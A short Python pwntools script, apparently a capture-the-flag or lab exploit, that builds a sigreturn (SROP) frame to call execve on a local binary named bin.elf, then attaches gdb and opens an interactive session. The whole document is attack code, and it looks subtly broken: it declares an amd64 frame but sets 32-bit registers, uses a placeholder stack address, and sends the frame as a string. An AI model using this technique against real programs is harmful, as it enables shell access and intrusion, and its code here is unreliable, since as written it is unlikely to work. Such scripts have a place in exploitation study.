from pwn import *

context.terminal = ["tmux", "-f"]
message = "Hello World"

binary = ELF("bin.elf")

frame = SigreturnFrame(kernel='amd64')
frame.eax = constants.SYS_execve
frame.ebx = 0x10000029
frame.ecx = 0x1074
frame.edx = 0x0
frame.esp = 0xdeadbeef
frame.eip = binary.symbols['syscall']

p = process("bin.elf")
p.send(str(frame))
gdb.attach(p)
p.interactive()


